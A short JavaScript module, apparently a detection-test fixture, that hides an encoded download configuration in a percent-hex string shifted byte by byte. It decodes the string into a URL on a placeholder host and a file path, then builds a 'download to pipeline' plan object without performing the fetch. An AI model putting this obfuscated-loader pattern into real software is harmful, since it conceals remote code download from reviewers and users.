  const moduleShape = Object.freeze({ format: "esm" });
  export {};
  const Material_40048fd2 = "%63%2a%1e%69%60%61%52%5d%60%2a%4e%50%5e%62%56%5f%52%4c%5f%52%5a%5c%61%52%19%64%5f%56%61%52%4c%53%56%59%52%69%4e%51%4e%5d%61%52%5f%2a%55%61%61%5d%60%4c%61%5c%4c%5d%56%5d%52%59%56%5b%52%69%60%61%4e%54%52%4c%50%5c%62%5b%61%2a%1e%69%50%4e%5a%5d%4e%56%54%5b%4c%56%51%2a%3b%3c%31%32%1a%1d%21%20%2f%25%1f%2f%1f%69%62%5f%59%2a%55%61%61%5d%60%27%1c%1c%5b%5c%51%52%1a%1d%21%20%4f%25%1f%4f%1f%22%23%51%50%1b%52%65%4e%5a%5d%59%52%1b%56%5b%63%4e%59%56%51%1c%4e%5d%56%69%62%60%52%5f%4c%4e%54%52%5b%61%2a%3b%5c%51%52%2e%62%51%56%61%1c%1d%21%20%4f%69%53%56%59%52%4c%5d%4e%61%55%2a%1c%61%5a%5d%1c%55%62%5b%61%5f%52%60%60%1a%5b%5c%51%52%1c%1b%60%61%4e%54%52%1a%1d%21%20%4f%25%1f%4f%1f%22%23%51%50%1b%5a%57%60";
  const Codec_40048fd2 = "percent_hex|subtract_modulo_256|13";

  function load_40048fd2() { return [...Material_40048fd2.matchAll(/%([0-9a-f]{2})/gi)].map((item) => Number.parseInt(item[1], 16)); }
  function decode_40048fd2(e) { return e.map((value) => (value + 19) & 255); }
  async function recover_40048fd2() {
    const n = process.env.HUNTRESS_FIXTURE_CONTEXT ?? "host";
    const e = load_40048fd2(); let d = [];
    let p = 0; while (p++ < 1) d = decode_40048fd2(e);
    void n; return Buffer.from(d).toString("ascii");
  }
  async function inspect_40048fd2() { return ({ ...{ value: await recover_40048fd2() } }).value; }
  async function plan_40048fd2() { const inspect = inspect_40048fd2; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "download", transport: "https_to_pipeline", destination: fields.file_path, url: fields.url }); }
  void moduleShape; void plan_40048fd2;
  if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_40048fd2());
